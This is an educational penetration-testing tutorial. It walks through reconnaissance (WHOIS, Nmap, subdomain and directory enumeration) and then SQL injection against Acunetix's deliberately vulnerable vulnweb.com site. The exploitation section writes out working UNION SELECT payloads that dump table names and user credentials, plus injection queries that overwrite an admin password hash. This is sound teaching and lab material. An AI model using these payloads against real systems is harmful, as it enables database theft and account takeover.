# Information Gathering & Vulnerability Exploitation

<div align="center">
  <img src="https://github.com/user-attachments/assets/c5af54cf-8762-4e9b-b37e-321f95cac324" alt="1_MlLvWoOg1c-PBerXGVs77w"><br>
</div>

<b>Information Gathering</b> is the extremely important first step in any Penetration Testing and Vulnerability Research process. The goal of this phase is to gather information about the test target whether it's a network, system, or application without triggering alerts or aggressively interacting with it. This step allows hackers or vulnerability researchers to understand the target's structure, configuration, and potential weaknesses, which can later be used to identify vulnerabilities.

Types of Information Gathering
There are two main types of Information Gathering:

<b>Active Information Gathering</b><br>
<b>Passive Information Gathering</b>

<b>Active Information Gathering</b>
Active Information Gathering involves direct interaction with the target system. This type of collection assumes that there is communication between the tester and the target, which can trigger alarms or warnings if security measures are used.<br>

In an information gathering procedure for several reasons, especially in the context of security assessments or in the preparation of a cyber footprinting attack. 
This information provides important details about the owner of a domain or IP and can be used to better understand the structure.
WHOIS information can be used to analyze a domain's ownership history, helping to understand its past activities and possible security issues. For example, if a domain has been previously associated with malicious activity, this may raise questions about its safety.<br>

```whois vulnweb.com```

![whois](https://github.com/user-attachments/assets/7efdca63-98f6-49cc-955f-701bffa838c0)

The WHOIS information for the vulnweb.com domain contains several sensitive details that could be misused if not handled carefully. Here is a description of the main sensitive information:<br>

Information about the domain holder:
```
Number: Acunetix Acunetix
Organization: Acunetix Ltd
Address: 3rd Floor, J&C Building, Road Town, Tortola, VG1110, British Virgin Islands (VG)
Email: administrator@acunetix.com
Phone: +1.23456789
```
WHOIS allows anyone to access public data about the owners of a web domain, including details about who registered the domain, when it was registered, when it expires, and technical and administrative contact information. WHOIS information is collected during the domain registration process. When a person or organization registers a web domain, they must provide certain contact information to the domain registrar (the entity responsible for managing a particular set of domains, such as .com, .org, etc.).

Examples of Actives Information Gathering:<br>
<b>Port scanning (using tools like Nmap)</b>: The tester scans the target to identify which ports are open and which services are available.<br>

<b>Banner grabbing</b>: Extracts information displayed by certain services (eg web server) to determine which software version is being used.<br>

<b>Ping sweep</b>: Determining active devices on a network.


![nmap](https://github.com/user-attachments/assets/40679efe-f3a2-4520-97be-28d6a8d97c40)

Simple scanning a domaine name with Nmap

```
nmap -Pn -n -v -sV vulnweb.com
```

To detail the earlier commands

```
-Pn - Ping Disable
-n  - No DNS Resolution
-v  - Verbose ( detailed display )
-sV - Service Version Detections
```

Most important details that we can observe here are the server version on 80 port

```
80/tcp open http nginx 1.19.0
```

We can find now the CVE for nginx 1.19.0

![334](https://github.com/user-attachments/assets/3fc8fac0-de4b-4adc-aa2d-0fd3489b2b46)

Or we search exploit in Metasploit, Metasploit is the most popular framework for penetration testing and vulnerability exploitation.

![metasploit](https://github.com/user-attachments/assets/29a17b5e-15a8-4946-b3ba-3998e8063cc8)


<b>Passive Information Gathering</b> is the process of gathering information without directly interacting with the target system. This type of information is obtained from public sources or other available data without leaving detectable traces on the target system.<br>

<b>Maltego</b>: A powerful OSINT tool that helps connect and correlate public data. It is used to map relationships between organizations, domains, and IP addresses.<br>

<b>theHarvester</b>: This tool collects data from public sources such as search engines, social networks and public databases to obtain information about email addresses, domains and phone numbers.<br>

<b>Shodan</b>: A search engine that allows finding devices connected to the Internet. It is used to obtain information about IoT devices, servers and other exposed systems.<br>

![shodan](https://github.com/user-attachments/assets/beff54c6-fef2-439c-86b6-69010e44bb57)


The Information Gathering phase is essential, because it ensures a complete understanding of the attack surface. This process includes several steps that vary depending on the complexity of the target:

<b>Target identification</b><br>
This involves determining the IP address, associated domains, and system infrastructure. A tool like Whois or Nslookup can be used to get basic information about the domain and IPs.<br>

<b>Network Mapping</b><br>
This step involves scanning and identifying active devices, services and open ports on the target network. Nmap and Netcat are the preferred tools for this purpose.<br>

<b>Identification of services</b><br>
This stage collects details about the services and applications running on the open ports. Tools like Nmap and Nikto can help extract information about software version and potential vulnerabilities.<br>

<b>Collection of public data (OSINT)</b><br>
Using tools like theHarvester and Maltego, testers collect relevant public information about the organization, such as the company structure, key employees and the technologies used. This information can be used for social engineering attacks or to identify weaknesses in the IT infrastructure.<br>

Detecting subdomains is an important part of the Information Gathering process, especially in Penetration Testing, because subdomains can reveal hidden resources, unprotected applications, or out-of-date servers that may represent a vulnerability.<br> Subdomains are part of the infrastructure of a main domain and are often used to manage separate services or applications (ex: testphp.vulnweb.com).<br>
There are several methods to detect subdomains, each with its own advantages:

<b>Brute Force</b><br>
This method involves using a file of lists of possible subdomain names to guess and test for their existence.<br>

<b>OSINT (Open Source Intelligence)</b><br>
This method uses public sources to collect information about subdomains. You can get subdomains from:<br>
Search engines<br>
Public databases<br>
theHarvester: Collects information from public sources like Google, Bing, Yahoo, etc. to detect subdomains.<br>
Amass: A powerful tool for OSINT and passive enumeration of subdomains using databases and other public sources.<br>

<b>DNS Enumeration</b><br>
This method involves querying DNS servers to obtain information about subdomains through exposed DNS records.<br>
DNSDumpster: A service that does DNS enumeration to find subdomains and other details about a domain's DNS configuration.<br>
Nslookup and Dig: Command line tools for querying DNS servers.<br>

<b>Google Dorking</b><br>
By using Google Dorks, one can find subdomains indexed by search engines.<br>
Example: ```site:vulnweb.com -www ``` will search all subdomains indexed by Google for the vulnweb.com domain, excluding www.<br>

![google dorks](https://github.com/user-attachments/assets/dde91e6b-dad0-4ede-8e4a-d07602d93d8a)

We can also use a specialized tool for this written in python, Name is Sublist3r, An efficient tool that uses multiple sources, including brute force with wordlists, to detect subdomains.

```
python3 sublist3r.py -d vulnweb.com

[-] Enumerating subdomains now for vulnweb.com
[-] Searching now in Baidu..
[-] Searching now in Yahoo..
[-] Searching now in Google..
[-] Searching now in Bing..
[-] Searching now in Ask..
[-] Searching now in Netcraft..
[-] Searching now in DNSdumpster..
[-] Searching now in Virustotal..
[-] Searching now in ThreatCrowd..
[-] Searching now in SSL Certificates..
[-] Searching now in PassiveDNS..

Result:
http://testaspnet.vulnweb.com/
http://rest.vulnweb.com/                                                                                                                                                                                         
http://testphp.vulnweb.com/                                                                                                                                                                                        
http://testhtml5.vulnweb.com/                                                                                                                                                                                      
http://testasp.vulnweb.com/
http://www.vulnweb.com/
```

<h2>HTTP Assets</h2>
Finding <b>HTTP assets</b> (such as directories, parameters, and versions of web application or server technologies) is a very important step in Penetration Testing, especially during the Information Gathering phase.<br>
<br><b>Hidden directories and files</b>: Identifying hidden directories and files can reveal unprotected or sensitive resources such as admin panels, backup files, or configuration files that contain critical server information.<br>
<br><b>Vulnerable parameters</b>: Finding and analyzing URL-level parameters can help identify potential vulnerabilities such as SQL Injection, Cross-Site Scripting (XSS), File Inclusion, or other injection attacks.<br>
<br><b>Web Application Version</b>: Once you know the version of a web application or CMS (ex: WordPress, Joomla, Drupal), you can check for known vulnerabilities for that version, giving you precise attack points.<br>
<br><b>Version of PHP or other server-side technologies</b>: Detecting the version of PHP, Apache, Nginx, or other server-side technologies is crucial because certain versions may contain unpatched critical vulnerabilities. For example, old versions of PHP may have Remote Code Execution (RCE) vulnerabilities.<br><br>

In the http response header we can see that the php flag is activated, therefore the php version is visible this is a security issues.

```PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1```

![http](https://github.com/user-attachments/assets/49a3eeb8-60a7-4a09-962a-82240200c3b6)

Just like in the example with the nginx server and for this version of php we can search for CVE.<br>


<b>Directory brute-forcing</b>: Using lists of common directories and files to find hidden or unindexed directory.<br>

<b>Tools:</b><br>
<b>Filebuster</b>: Used for brute-forcing directories and files.<br>
<b>Dirb or Dirsearch</b>: Tools that scan hidden directories and files on a web server.<br>

![7a3d47f7-db81-41c8-9a34-4d0d2ce3ae82](https://github.com/user-attachments/assets/beeed419-566c-4d23-b7dc-5d4d86c8f29e)


```
./dirsearch.py -u http://vulnweb.com/
```

For example this directory /admin/ contains a sensitive .sql file that could contain tables or dumps from the database<br>

![sqli](https://github.com/user-attachments/assets/d3a777de-bb62-4c45-a4c9-de41b8fc90f3)


<b>Identification of parameters:</b><br>

<b>URL Crawling</b>: A crawler can help discover URLs and parameters in your web application.<br>
<b>Burp Suite</b>: The Burp Suite crawler can identify parameters from URLs and web applications.<br>
<b>OWASP ZAP</b>: </b>Another open-source tool that can crawl URLs and discover parameters.<br>
<b>Fuzzing for hidden parameters</b>: </b>Fuzzing can help discover parameters that are not obviously exposed but may trigger unintended behaviors in the application.<br>

Listing directories and parameters may reveal unprotected endpoints, administrative interfaces, or sensitive configuration files.<br>
Detecting application versions and server-side technologies is important to look for known vulnerabilities. <br>
Once you know the version of a web application, you can check public vulnerability databases (eg CVE or Exploit-DB) to see if there are exploitable vulnerabilities for that version.<br>
PHP or web server versions (ex: Apache, Nginx) can reveal critical vulnerabilities if they use old and out-of-date versions, which can open to more advanced exploits such as Remote Code Execution (RCE).<br>

We can see a screenshot below with the OWASP-ZAP tool ( OWASP - Open Web Application Security Project, is a global non-profit organization focused on improving web application security )

![zap](https://github.com/user-attachments/assets/9254feb1-d28b-488c-96ff-f30110718118)

<h2>Vulnerability Exploitation</h2>

After we have gone through all the necessary steps of collecting information, we can move on to stage two, Finding and exploiting vulnerabilities in the web application

For example in url ```http://testphp.vulnweb.com/artists.php?artist=1``` we have parameter "artist" we test this for SQL Injection we need to add a string in parameter value.
To see how the application responds

```http://testphp.vulnweb.com/artists.php?artist=1%27```

![sqli1](https://github.com/user-attachments/assets/4f378cd0-b24f-459d-8906-1deedbbe30a9)


We can see in this screenshot two vulnerability:<br>
Vulnerability one ( Full path disclosure )<br>
Vulnerability two ( SQL Injection )<br>

```
Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /hj/var/www/artists.php on line 62
```

This error occurs because the ```mysql_fetch_array()``` function expects a resource (a valid result of a SQL query) but receives a boolean (true or false).This usually happens when the SQL query does not return a valid result.<br>
If the SQL query failed (for example, due to a syntax error in the SQL or database connection problems), ```the mysql_query()``` function will return false instead of a resource. And when you try to use ```mysql_fetch_array()``` on this result, you will get this error.<br>

To exploit the SQL Injection we can use the famous sqlmap tool but we can also do the manual query using UNION SELECT

In SQL attack Injection UNION is used in the context of SQL  to concatenate a legitimate SQL query with a malicious one, allowing the attacker to extract data from tables that would not be accessible by the original query. Using UNION in SQL Injection is an effective method to combine the results of legitimate and malicious queries

```
http://testphp.vulnweb.com/artists.php?artist=-1 union select 1,2,3-- -
```
![sql2](https://github.com/user-attachments/assets/289e1088-9652-44fa-b9c1-39eb1f26ef32)

In the example above we can see that column 2 is vulnerable, as a result we can use malicious queries to manipulate the database.
```
http://testphp.vulnweb.com/artists.php?artist=-1 union select 1,group_concat(0x0a,table_name),3 from information_schema.tables where table_Schema=database()-- -
```
Now we see all tables from database

```artists, carts, categ, featured, guestbook, pictures, products, users```

I want to see columns from users table for this i execute this interogation:

```
http://testphp.vulnweb.com/artists.php?artist=-1 union select 1,group_concat(0x0a,column_name),3 from information_schema.columns where table_name="users"-- -
```

![sqli3](https://github.com/user-attachments/assets/6af02541-bbe3-443c-bc9f-5af4079b8521)


```
http://testphp.vulnweb.com/artists.php?artist=-1 union select 1,group_concat(0x0a,uname,0x0a,pass),3 from users-- -
```

And dump for this interrogation is:
```
uname:test
pass:test
```

If a parameter is sent  with POST data, this does not make it visible in like as in the case of the GET parameter, the request will have to be captured and manipulated to be able to query the database using POST data, the procedure is similar and an extremely good tool for this is BurpSuite.

![burp](https://github.com/user-attachments/assets/c37a19c6-7f8b-495e-a4d6-59f6643b31e0)

In most databases your will find passwords encrypted in different algorithms, MD5 SHA1 BCRYPT etc... 
If they are encrypted MD5 or SHA1 you can try to break them using different online platforms, if they are BCRYPT you can try an offline attack on them using a password dictionary.
Fortunately, SQL Injection allows much more, so we can overwrite a new password for the user with a malicious sql query.
This is possible if the SQL user used by the application must have UPDATE privileges on the admin table.

```
https://localhost/index.php?id=-99 union select 1,2,3,updatexml(null,concat(0x3a,(update admin set admin_pass='$2y$10$sloVQDRfzY0fiGta6YX/8.2sgjYKyu8.D3TT8.x2r4mFJ4vquLUSq' where admin_name='admin')),null),5,6,7--
https://localhost/index.php?id=-99 union select 1,2,3,1,(select admin_pass from admin where admin_name='admin' limit 1),6,(update admin set admin_pass='$2y$10$sloVQDRfzY0fiGta6YX/8.2sgjYKyu8.D3TT8.x2r4mFJ4vquLUSq' where admin_name='admin'),7--
https://localhost/index.php?id=-99; update admin set admin_pass='$2y$10$sloVQDRfzY0fiGta6YX/8.2sgjYKyu8.D3TT8.x2r4mFJ4vquLUSq' where admin_name='admin'-- 
```

These are some of the queries through which you can set a new hash for the admin user.

To exemplify and detail the information, I used vulnweb.com from acunetix, This article was written strictly for educational purposes. I do not support malicious activities in any way.
I hope you found the information useful and gave you a clearer perspective on the subject of cybercrime.






